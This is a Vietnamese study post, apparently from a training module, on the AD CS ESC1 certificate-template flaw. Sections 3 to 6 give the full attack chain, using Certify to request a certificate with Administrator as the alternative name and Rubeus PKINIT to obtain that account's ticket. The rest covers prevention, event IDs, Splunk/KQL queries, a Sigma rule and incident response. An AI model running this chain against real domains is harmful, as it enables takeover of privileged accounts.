---
layout: post
title: "PKI - ESC1"
date: 2026-07-14 00:09:30 +0700
categories: ["Windows Attacks & Defense", "Detection & Monitoring"]
tags: [active-directory, windows-attacks-defense, adcs, pki, esc1, certificate-templates, certify, rubeus, pkinit, event-4886, event-4887, event-4768, splunk, elk, sigma, threat-hunting, incident-response, cdsa]
description: "Tóm tắt PKI ESC1: certificate template misconfiguration, SAN abuse, Certify, PKINIT, prevention và detection bằng Event ID 4886, 4887 và 4768."
toc: true
---

# PKI - ESC1

Bài này thuộc module **Windows Attacks & Defense**, tập trung vào kỹ thuật **ESC1** trong Active Directory Certificate Services và cách phòng thủ/phát hiện theo góc nhìn SOC/CDSA.

> Chỉ thực hành trong HTB, lab hoặc hệ thống có ủy quyền rõ ràng. Không request certificate cho user khác ngoài phạm vi được phép.

## Timeline cập nhật

```text
Created at: 2026-07-14 00:09:30 +0700
Timezone: Asia/Ho_Chi_Minh
Module: Windows Attacks & Defense
Section: PKI - ESC1
Focus: AD CS, certificate templates, SAN abuse, PKINIT, 4886/4887/4768
```

## 1. ESC1 là gì?

ESC1 xảy ra khi certificate template cho phép requester tự chỉ định Subject Alternative Name và template đó dùng được cho authentication.

Điều kiện thường gặp:

```text
Requester có quyền Enroll
ENROLLEE_SUPPLIES_SUBJECT được bật
Không cần manager approval
Không yêu cầu authorized signatures
Template có Client Authentication hoặc Smart Card Logon
```

Điều này cho phép một domain user request certificate nhưng đặt SAN là user khác, kể cả privileged user.

## 2. Vì sao certificate nguy hiểm?

Certificate có thể:

- Sống lâu hơn password.
- Không bị vô hiệu hóa khi password đổi.
- Dùng để request Kerberos TGT qua PKINIT.
- Tạo persistence dài hạn.
- Dẫn tới Golden Certificate nếu CA private key bị compromise.

## 3. Quét bằng Certify

Trong HTB lab:

```powershell
.\Certify.exe find /vulnerable
```

Cần chú ý:

```text
Template Name
Enrollment Rights
ENROLLEE_SUPPLIES_SUBJECT
Authorized Signatures Required
Extended Key Usage
Manager Approval
```

Ví dụ vulnerable template:

```text
Template: UserCert
Enrollment Rights: Domain Users
Validity: 10 years
EKU: Client Authentication, Smart Card Logon
```

## 4. Request certificate trong lab

```powershell
.\Certify.exe request `
  /ca:PKI.eagle.local\eagle-PKI-CA `
  /template:UserCert `
  /altname:Administrator
```

Flow:

```text
Requester thực tế: EAGLE\bob
SAN được yêu cầu: Administrator
Certificate được CA cấp ngay
```

## 5. Chuyển PEM sang PFX

Chuẩn hóa PEM:

```bash
sed -i 's/\s\s\+/\n/g' cert.pem
```

Chuyển sang PFX:

```bash
openssl pkcs12   -in cert.pem   -keyex   -CSP "Microsoft Enhanced Cryptographic Provider v1.0"   -export   -out cert.pfx
```

## 6. Authenticate bằng certificate

Dùng Rubeus và PKINIT:

```powershell
.\Rubeus.exe asktgt `
  /domain:eagle.local `
  /user:Administrator `
  /certificate:cert.pfx `
  /dc:dc1.eagle.local `
  /ptt
```

Kiểm tra:

```powershell
klist
```

Nếu thành công, attacker có TGT của user được chỉ định trong SAN.

## 7. Tác động

Nếu certificate cho privileged account được cấp:

- Request TGT.
- Authenticate như privileged user.
- Truy cập SMB/WinRM/RDP.
- Lateral movement.
- Persistence cho đến khi certificate hết hạn hoặc bị revoke.

```text
Password reset không đủ để xử lý certificate compromise.
```

## 8. Prevention

- Tắt `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`.
- Không cho Domain Users enroll template authentication nhạy cảm.
- Bật CA manager approval.
- Yêu cầu authorized signatures.
- Thu hẹp EKU.
- Rút ngắn validity period.
- Review template ACL.
- Scan AD CS định kỳ bằng Certify/Certipy.
- Revoke certificate bị lạm dụng.
- Bảo vệ CA private key.
- Tách CA role khỏi server khác.

## 9. Event ID 4886

```text
4886 - Certificate Services received a certificate request
```

Field cần xem:

- Request ID.
- Requester.
- Certificate Template.
- Attributes.
- CA host.

Hạn chế:

```text
4886 thường không hiển thị đầy đủ SAN trong giao diện tổng quát.
```

## 10. Event ID 4887

```text
4887 - Certificate Services approved a certificate request and issued a certificate
```

Correlation quan trọng:

```text
4886 nhận request
        ↓
4887 certificate được cấp
        ↓
4768 certificate được dùng để request TGT
```

## 11. Kiểm tra SAN trong certificate

GUI tổng quát của CA có thể không hiển thị SAN. Cần mở certificate và xem:

```text
Subject Alternative Name
Other Name
Principal Name
```

Ví dụ:

```text
Principal Name=Administrator
```

![Issued certificate SAN Administrator](/assets/img/windows-attacks-defense/pki-esc1/issued-certificate-san-administrator.png)

## 12. certutil -view

```cmd
certutil -view
```

Nên filter hoặc parse theo:

- Request ID.
- Template.
- Requester.
- Serial number.
- SAN/UPN.

## 13. Event ID 4768 với PKINIT

```text
4768 - A Kerberos authentication ticket (TGT) was requested
```

Khi dùng certificate, event có thể chứa:

- Certificate Issuer Name.
- Certificate Serial Number.
- Certificate Thumbprint.
- Account Name.
- Client Address.

## 14. Splunk Detection

CA request/issuance:

```spl
index=wineventlog sourcetype=WinEventLog:Security
EventCode IN (4886,4887)
| table _time host EventCode Requester Request_ID Certificate_Template Serial_Number
```

Template nhạy cảm:

```spl
index=wineventlog sourcetype=WinEventLog:Security EventCode=4887
Certificate_Template="UserCert"
| stats count values(Request_ID) as request_ids values(Serial_Number) as serials by Requester, host
```

PKINIT:

```spl
index=wineventlog sourcetype=WinEventLog:Security EventCode=4768
Cert_Issuer_Name=*
| table _time host Account_Name Client_Address Cert_Issuer_Name Cert_Serial_Number Cert_Thumbprint
```

## 15. ELK/KQL

```kql
event.code: ("4886" or "4887")
```

```kql
event.code: "4887" and winlog.event_data.CertificateTemplate: "UserCert"
```

```kql
event.code: "4768" and winlog.event_data.CertIssuerName: *
```

## 16. Sigma Rule

```yaml
title: Certificate Issued From Sensitive AD CS Template
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4887
    CertificateTemplate: 'UserCert'
  condition: selection
falsepositives:
  - Approved certificate enrollment
level: high
```

## 17. Threat Hunting

Hunt theo:

- Domain Users enroll template có Client Authentication.
- Requester khác với SAN/UPN.
- Template có `ENROLLEE_SUPPLIES_SUBJECT`.
- Certificate validity quá dài.
- PKINIT cho privileged user từ workstation thường.
- Certificate request ngoài change window.
- Serial/request ID xuất hiện trong authentication bất thường.

## 18. Incident Response Checklist

```text
[ ] Xác định Request ID và requester.
[ ] Xác định template.
[ ] Trích SAN/UPN.
[ ] Xác định serial/thumbprint.
[ ] Review 4886 và 4887 trên CA.
[ ] Review 4768 trên DC.
[ ] Revoke certificate.
[ ] Publish/update CRL nếu cần.
[ ] Rotate credential liên quan.
[ ] Sửa template permissions/flags.
[ ] Hunt certificate-based authentication.
[ ] Kiểm tra persistence và lateral movement.
```

## 19. Mapping với CDSA

**Security Operations & Monitoring:** thu 4886/4887 từ CA và 4768 từ DC.

**Incident Response & Forensics:** thu certificate/PFX/PEM artifact, xác định private-key exposure, revoke certificate.

**Threat Hunting:** hunt vulnerable template usage, privileged SAN và PKINIT từ source lạ.

**Detection Engineering:** correlation `4886 → 4887 → 4768`, Sigma cho template nhạy cảm và enrichment bằng CA database.

## 20. Lab Setup

```text
1 Domain Controller
1 Enterprise CA/AD CS server
1 Windows workstation
1 Splunk/ELK/Wazuh server
Windows Event Forwarding hoặc agent
```

Log cần thu:

```text
CA Security: 4886, 4887
DC Security: 4768
Sysmon: 1, 3, 11
PowerShell Operational
```

Kiểm tra event:

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4886}
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4887}
```

## Key Takeaway

```text
ESC1 xảy ra khi requester được tự chỉ định SAN trên template dùng cho authentication.
Certificate vẫn có thể hợp lệ sau khi password đổi.
Detection chính là 4886/4887 trên CA và 4768 trên DC.
GUI CA không luôn hiển thị SAN; cần kiểm tra certificate hoặc certutil.
Prevention tốt nhất là bỏ ENROLLEE_SUPPLIES_SUBJECT và siết quyền enroll.
```
